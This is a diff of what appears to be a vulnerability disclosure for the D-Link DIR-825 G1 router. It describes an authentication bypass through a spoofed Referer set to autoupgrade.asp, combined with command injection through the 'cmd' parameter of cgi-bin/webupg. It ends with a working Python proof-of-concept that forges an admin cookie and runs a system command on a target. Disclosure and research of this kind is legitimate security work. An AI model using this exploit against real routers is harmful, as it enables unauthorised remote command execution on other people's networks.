@@ -9,22 +9,90 @@ An authorization command injection vulnerability about DIR-825
 DIR-825(G1): all
 </br>......
 <br/>**Hardware Link:**https://downloads.d-link.co.za/DIR/dir825%20(new)/firmware/
-## The detail of vulnerability
-#### 1.Authentication bypasses the vulnerability
+## 1. Authentication bypasses the vulnerability
+
 In the "webupg" binary, attackers can bypass authentication through parameters "autoupgrade.asp", and perform functions such as downloading configuration files and updating firmware without authorization.
 
-#### Vulnerability trigger function
-![image](https://github.com/tgp-top/DAP-1360/blob/4f10977bb7356d1393fefcba24ca438be95248b2/%E5%9B%BE%E7%89%87/5.png)
+![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20133715.png)
 
+Through the web port, attackers can access "autoupgrade.asp" without authorization.
 
-`UPGCGI_CreateDir`
-![image](https://github.com/tgp-top/DAP-1360/blob/2d09c23efafd8d3199b0a84d5b159f3cdbd26638/%E5%9B%BE%E7%89%87/1.png)
+![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20140001.png)
+#### BurpSuite Test
 
-`UPGCGI_Delete`
-![image](https://github.com/tgp-top/DAP-1360/blob/2d09c23efafd8d3199b0a84d5b159f3cdbd26638/%E5%9B%BE%E7%89%87/2.png)
+Replace "cgi-bin/webupg" at Referer with "autoupgrade.asp"
 
-`UPGCGI_ModifyMac`
-![image](https://github.com/tgp-top/DAP-1360/blob/2d09c23efafd8d3199b0a84d5b159f3cdbd26638/%E5%9B%BE%E7%89%87/3.png)
+![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20134942.png)
 
-`Burpsuite intercept`
-![image](https://github.com/tgp-top/DAP-1360/blob/220154515d7b765ecc8daffd6c990ba45df4735f/%E5%9B%BE%E7%89%87/4.png)
+![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20135536.png)
+
+## 2. Authorization Remote Command Execution
+
+In the "webupg" binary, because of the lack of parameter verification, attackers can use "cmd" parameters to execute arbitrary system commands after obtaining authorization
+
+`shell`
+![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20145714.png)
+
+![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20145811.png)
+
+![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20145901.png)
+
+#### BurpSuite Test
+
+Combine these two vulnerabilities, that attack can realize RCE
+
+![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20145991.png)
+
+## POC
+<sup> 
+  
+  
+  
+    # DIR-825
+    # arch:mipsel
+    # hw:G1
+    # fw:7.XX
+    import urllib
+    import requests
+    import linecache
+    import sys
+    import threading
+    from urllib.parse import urlparse
+    from concurrent.futures import ThreadPoolExecutor
+    import urllib3
+    urllib3.disable_warnings()
+
+    def attack(url):
+        scheme = urlparse(url).scheme
+        hostname = urlparse(url).hostname
+        port = urlparse(url).port
+        header={
+            'Host':hostname+':'+str(port),
+            'Origin': url,
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
+            'Referer': url+'/autoupgrade.asp',
+            'Cookie': 'sessionid=ae3aa37; auth=ok; expires=Sun, 15-May-9999 01:45:46 GMT; language=en_us; sys_UserName=admin',
+            'Connection': 'close',
+        }
+
+        data=urllib.parse.urlencode(
+            { 'name': 'shell',
+              'cmd': 'ifconfig',
+            'key': 'twmode',}, quote_via=urllib.parse.quote)
+        urls = url+'/cgi-bin/webupg'
+        try:
+            ret = requests.post(url=urls,
+                          headers=header,
+                          data=data,
+                          verify=False,
+                          allow_redirects=False,
+                          timeout=30,
+                          )
+        except Exception:
+            return
+
+    if __name__ == "__main__":
+        rhost = sys.argv[1]
+        attack(rhost)
+</sup>
